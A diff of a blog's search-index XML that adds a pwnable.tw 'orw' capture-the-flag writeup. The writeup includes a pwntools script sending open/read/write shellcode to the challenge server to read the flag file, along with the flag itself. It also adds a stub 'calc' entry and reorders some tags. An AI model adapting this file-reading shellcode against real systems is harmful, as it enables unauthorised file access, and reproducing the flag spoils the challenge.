@@ -3,6 +3,27 @@
   
     
     <entry>
+      <title><![CDATA[pwnable.tw calc]]></title>
+      <url>/2017/10/16/pwnable-tw-calc/</url>
+      <content type="html"><![CDATA[<p>zhe ti tai nan le…<br>wo hao cai a</p>
+]]></content>
+      
+        <categories>
+            
+            <category> writeup </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[pwnable.tw orw]]></title>
       <url>/2017/10/15/pwnable-tw-orw/</url>
       <content type="html"><![CDATA[<p>程序先调用了<code>orw_seccomp</code>函数<br>函数里有两个关键函数</p>
@@ -82,8 +103,47 @@ struct sock_filter      /* Filter block */
 <p>除了用prctl也可以用prctl的system call来进入这个模式</p>
 </blockquote>
 <p>所以, 下面是</p>
-<pre class="line-numbers language-python"><code class="language-python">
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"chall.pwnable.tw"</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># read -> open -> read -> write</span>
+shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+mov eax, 0x03
+xor ebx, ebx
+mov ecx, esp
+mov edx, 0x10
+int 0x80
+
+mov eax, 0x05
+mov ebx, esp
+xor ecx, ecx
+xor edx, edx
+int 0x80
+
+mov ebx, eax 
+mov eax, 0x03
+mov ecx, esp
+mov edx, 0x30
+int 0x80
+
+mov eax, 0x04
+mov ebx, 1
+mov ecx, esp
+mov edx, 0x30
+int 0x80
+'''</span>
+
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+
+raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/home/orw/flag"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 ]]></content>
       
         <categories>
@@ -10808,9 +10868,9 @@ is restricted to users with role &quot;admin-gui&quot;. Users are defined in /et
         
         <tags>
             
-            <tag> Linux </tag>
-            
             <tag> 周五 </tag>
+            
+            <tag> Linux </tag>
             
         </tags>
         
@@ -11085,14 +11145,14 @@ creature<span class="token punctuation">.</span><span class="token function">sle
   
     
     <entry>
-      <title><![CDATA[tags]]></title>
-      <url>/tags/index.html</url>
+      <title><![CDATA[友链]]></title>
+      <url>/links/index.html</url>
       <content type="html"></content>
     </entry>
     
     <entry>
-      <title><![CDATA[友链]]></title>
-      <url>/links/index.html</url>
+      <title><![CDATA[tags]]></title>
+      <url>/tags/index.html</url>
       <content type="html"></content>
     </entry>
     
